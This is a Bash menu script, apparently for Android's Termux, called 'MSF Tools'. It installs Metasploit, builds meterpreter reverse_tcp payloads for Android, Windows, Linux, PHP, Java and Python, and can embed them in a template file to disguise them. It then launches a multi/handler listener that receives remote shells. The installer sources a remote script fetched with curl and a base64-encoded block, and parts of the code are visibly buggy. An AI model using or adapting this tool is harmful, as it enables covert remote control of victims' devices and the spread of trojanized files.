#!/data/data/com.termux/files/usr/bin/bash
export RUBYOPT=-W0
reset_color="\033[0m"
red_color="\033[31m"
green_color="\033[32m"
brown_color="\033[33m"
blue_color="\033[34m"

center() {
  termwidth=$(stty size | cut -d" " -f2)
  padding="$(printf '%0.1s' ={1..500})"
  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}
center_text() {
  local text="$1"
  local width="$2"
  
  local text_length=${#text}
  local padding=$((($width - $text_length) / 2))
  
  local left_padding=""
  local right_padding=""
  
  for ((i = 0; i < $padding; i++)); do
    left_padding="${left_padding} "
    right_padding="${right_padding} "
  done

  local centered_text="${left_padding}${text}${right_padding}"
  echo "$centered_text"
}

showTitle() {
    judul="$(center_text "$1" 42)"
    echo -e "
${green_color}┈┏━━━━━━┓     ${green_color}[${red_color}  __ __  ___  ___   ___            _      ${green_color}]${reset_color}
${green_color}┈┈▏╱╱╱╱▕      ${green_color}[${red_color} |  \  \/ __>| __> |_ _| ___  ___ | | ___ ${green_color}]${reset_color}
${green_color}┈┈┣━┳━┳┫      ${green_color}[${red_color} |     |\__ \| _>   | | / . \/ . \| |<_-< ${green_color}]${reset_color}
${green_color}┈━╋━┻━┻╋━     ${green_color}[${red_color} |_|_|_|<___/|_|    |_| \___/\___/|_|/__/ ${green_color}]${reset_color}
${green_color}┈╭┫▊┃┃▊┣╮┈${reset_color}╭╯  ${green_color}[ ${blue_color}Created By Dx4           ${red_color}©Copyright 2023 ${green_color}]${reset_color}
${green_color}┈┃┃▔╰╯▔┃┃${reset_color}╭╯   ${green_color}[ ${reset_color}Version : ${blue_color}1.0                            ${green_color}]
${green_color}┈╰┫┏━━${brown_color}▂▂▂█    ${green_color}[${reset_color}${judul}${green_color}]${reset_color}
${green_color}┈┈╭╰━━╯╮      
${green_color}┈┈╭╭╭╯╮╮ ${reset_color}"
}

installMsfTermux() {
    mkdir -f $PREFIX/opt
    
    center " Loading..."
    source <(echo "c3Bpbm5lcj0oICd8JyAnLycgJy0nICdcJyApOwoKY291bnQoKXsKICBzcGluICYKICBwaWQ9JCEKICBmb3IgaSBpbiBgc2VxIDEgMTBgCiAgZG8KICAgIHNsZWVwIDE7CiAgZG9uZQoKICBraWxsICRwaWQgIAp9CgpzcGluKCl7CiAgd2hpbGUgWyAxIF0KICBkbyAKICAgIGZvciBpIGluICR7c3Bpbm5lcltAXX07IAogICAgZG8gCiAgICAgIGVjaG8gLW5lICJcciRpIjsKICAgICAgc2xlZXAgMC4yOwogICAgZG9uZTsKICBkb25lCn0KCmNvdW50" | base64 -d)
    
    echo
    center "Dependencies installation"
    rm $PREFIX/etc/apt/sources.list.d/*
    apt purge ruby -y
    rm -fr $PREFIX/lib/ruby/gems
    
    pkg upgrade -y -o Dpkg::Options::="--force-confnew"
    
    pkg install -y binutils python autoconf bison clang coreutils curl findutils apr apr-util postgresql openssl readline libffi libgmp libpcap libsqlite libgrpc libtool libxml2 libxslt ncurses make ncurses-utils ncurses git wget unzip zip tar termux-tools termux-elf-cleaner pkg-config git ruby -o Dpkg::Options::="--force-confnew"
    
    python3 -m pip install --upgrade pip
    python3 -m pip install requests
    
    echo
    center "Fix ruby BigDecimal"
    source <(curl -sL https://github.com/termux/termux-packages/files/2912002/fix-ruby-bigdecimal.sh.txt)
    
    echo
    center "Erasing old metasploit folder..."
    rm -rf $PREFIX/opt/metasploit-framework
    
    echo
    center "Downloading..."
    cd $PREFIX/opt
    git clone https://github.com/rapid7/metasploit-framework.git --depth=1
    
    echo
    center "Installation..."
    cd $PREFIX/opt/metasploit-framework
    
    gem install bundler
    declare NOKOGIRI_VERSION=$(cat Gemfile.lock | grep -i nokogiri | sed 's/nokogiri [\(\)]/(/g' | cut -d ' ' -f 5 | grep -oP "(.).[[:digit:]][\w+]?[.].")
    
    gem install nokogiri -v $NOKOGIRI_VERSION -- --use-system-libraries
    bundle config build.nokogiri "--use-system-libraries --with-xml2-include=$PREFIX/include/libxml2"; bundle install
    
    gem install actionpack
    bundle update activesupport
    bundle update --bundler
    bundle install -j$(nproc --all)
    if [ -e $PREFIX/bin/msfconsole ];then
    	rm $PREFIX/bin/msfconsole
    fi
    if [ -e $PREFIX/bin/msfvenom ];then
    	rm $PREFIX/bin/msfvenom
    fi
    if [ -e $PREFIX/bin/msfrpcd ];then
    	rm $PREFIX/bin/msfrpcd
    fi
    ln -s $PREFIX/opt/metasploit-framework/msfconsole $PREFIX/bin/
    ln -s $PREFIX/opt/metasploit-framework/msfvenom $PREFIX/bin/
    ln -s $PREFIX/opt/metasploit-framework/msfrpcd $PREFIX/bin/
    ln -s $PREFIX/opt/metasploit-framework/msfdb $PREFIX/bin/
    ln -s $PREFIX/opt/metasploit-framework/msfd $PREFIX/bin/
    ln -s $PREFIX/opt/metasploit-framework/msfupdate $PREFIX/bin/
    ln -s $PREFIX/opt/metasploit-framework/msfrpc $PREFIX/bin/
    
    termux-elf-cleaner $PREFIX/lib/ruby/gems/*/gems/pg-*/lib/pg_ext.so
    
    echo
    echo -e "Suppressing Warnings"
    
    sed -i '86 {s/^/#/};96 {s/^/#/}' $PREFIX/lib/ruby/gems/3.1.0/gems/concurrent-ruby-1.0.5/lib/concurrent/atomic/ruby_thread_local_var.rb
    sed -i '442, 476 {s/^/#/};436, 438 {s/^/#/}' $PREFIX/lib/ruby/gems/3.1.0/gems/logging-2.3.1/lib/logging/diagnostic_context.rb
    
    echo
    echo -e "Installation complete"
}
checkPackage() {
    if [ ! -x "$(command -v msfconsole)" ]; then
        echo -e "${red_color}[*]${reset_color} Metasploit Framework not installed..."
        echo -n -e "${blue_color}[*]${reset_color} Do you want install it? (Y/n) ?"; read winstall
        if [ "$winstall" != "n" ] || [ "$winstall" != "N" ]; then
            if [ "$(uname -o)" = "Android"]; then
                installMsfTermux
            else
                sudo apt install metasploit-framework
            fi
        else
            echo "Install aborted!."
            exit 1
        fi
    fi
}
#Function to generate payload
generate() {
    echo -n -e "${blue_color}[*]${reset_color} Use template (y/N) ?"; read usetemp
    if [ "$usetemp" = "y" ]; then
        while [ -z "$file_template" ]; do
            echo -n -e "${blue_color}[*]${reset_color} Template> "; read file_template
            if [ -e "$file_template" ]; then
                echo -e "${red_color}[*]${reset_color} Generating payload... "
                msfvenom -x $file_template -p $1/meterpreter/reverse_tcp LHOST=$2 LPORT=$3 -f $4 -o $5
            else
                echo -e "${red_color}[*]${reset_color} No template file found! "
            fi
        done
    else
        echo -e "${red_color}[*]${reset_color} Generating payload... "
        msfvenom -p $1/meterpreter/reverse_tcp LHOST=$2 LPORT=$3 -f $4 -o $5
    fi
}
remote() {
    echo -e "${blue_color}[*]${reset_color} Exploiting..."
    msfconsole -q -x "use multi/handler; clear; set payload $1/meterpreter/reverse_tcp; set LHOST $2; set LPORT $3; exploit"
}

selectPayload() {
    case $1 in
        1) target="android";;
        2) target="windows";;
        3) target="linux/x64";;
        4) target="linux/x86";;
        5) target="php";;
        6) target="java";;
        7) target="python";;
        *) exit 1;;
    esac
}

payloadMenus() {
    items=("Android" 
           "Windows" 
           "Linux x64"
           "Linux x86"
           "Web server php"
           "Java jar"
           "Python")
    showMenus "${items[@]}"
}

showMenus() {
    echo
    local menu=("$@") 
    for ((i=0; i<${#menu[@]}; i++)); do
        echo -e "${green_color}[${reset_color}$((i+1))${green_color}]${reset_color} ${menu[i]}"
    done
    echo
}

inputHost() {
    while [ -z "$lhost" ]; do
        echo -n -e "${blue_color}[*]${reset_color} lhost> "; read lhost
    done
    while [ -z "$lport" ]; do
        echo -n -e "${blue_color}[*]${reset_color} lport> "; read lport
    done
}
checkFileHost() {
    if [ -e ~/.defaulthost.msf ]; then
        echo -n -e "${blue_color}[*]${reset_color} Use default host? (Y/n)"; read usedefaulthost
        if ! [[ "$usedefaulthost" = "n" || "$usedefaulthost" = "N" ]]; then
            ip_and_port="$(cat ~/.defaulthost.msf)"
            lhost=$(echo "$ip_and_port" | cut -d':' -f1)
            lport=$(echo "$ip_and_port" | cut -d':' -f2) 
        else
            inputHost
        fi
    else
        inputHost
    fi
}
setMsfParameter() {
    case "$1" in
        "gethost") 
        checkFileHost
        ;;
        "host")
        inputHost
        echo "$lhost:$lport" > ~/.defaulthost.msf
        ;;
    esac
}
uninstallProgram() {
    echo
    echo -n "Uninstalling..."
    path=$(command -v $0)
    if [ "$(uname -o)" = "Android" ]; then
        rm -rf $path
    else
        sudo rm -rf $path
    fi
    if ! [ -e $path ]; then
        echo -e "\rUninstalling ${brown_color}[${green_color}√${brown_color}]${reset_color}"
    else
        echo -e "\rUninstalling ${brown_color}[${red_color}X${brown_color}]${reset_color}"
    fi
}



#activity main there
#for main menu or all
payloadCreatorActivity() {
    showTitle "Payload Creator Metasploit"
    payloadMenus
    echo -n -e "${blue_color}[*]${reset_color} Payload> "; read payloadselect
    selectPayload "$payloadselect"
    setMsfParameter gethost
    echo -n -e "${blue_color}[*]${reset_color} Format> "; read format
    echo -n -e "${blue_color}[*]${reset_color} Out> "; read out
    generate "$target" "$lhost" "$lport" "$format" "$out"
}
remoteActivity() {
    showTitle "Remote Access Payloads"
    payloadMenus
    echo -n -e "${blue_color}[*]${reset_color} Payload> "; read payloadselect
    selectPayload "$payloadselect"
    setMsfParameter gethost
    remote "$target" "$lhost" "$lport"
}
setHostActivity() {
    showTitle "Set Default Host Payload"
    echo
    setMsfParameter host
    echo -e "${green_color}[*]${reset_color} Done"
}
mainActivity() {
    clear
    showTitle "MSF Tools Menu"
    case "$1" in
        "-u") uninstallProgram;;
        *)
            checkPackage
            items=("Payload creator with msfvenom"
                   "Remote access payload (msfconsole)"
                   "Jump to msfconsole"
                   "Set default lhost or lport"
                   "Show default Host") 
            showMenus "${items[@]}"
            echo -e "${green_color}[${reset_color}0${green_color}]${reset_color} Exit"
            echo -n -e "${blue_color}[*]${reset_color} Select> "; read mainselect
            case $mainselect in
                1) clear && payloadCreatorActivity;;
                2) clear && remoteActivity;;
                3) echo -e "${blue_color}[*]${reset_color} Running msfconsole..." && msfconsole -q;;
                4) clear && setHostActivity;;
                5)
                if [ -e ~/.defaulthost.msf ]; then
                    echo
                    echo -e "${blue_color}[*]${reset_color} Default Hosts : $(cat ~/.defaulthost.msf)"
                else
                    echo
                    echo -e "${red_color}[*]${reset_color} Default host not be set"
                fi
                ;;
                0) exit 1;;
                *) echo -e "${red_color}[*]${reset_color} Invalid input" && sleep 1 && mainActivity;;
            esac
        ;;
    esac
}
mainActivity $1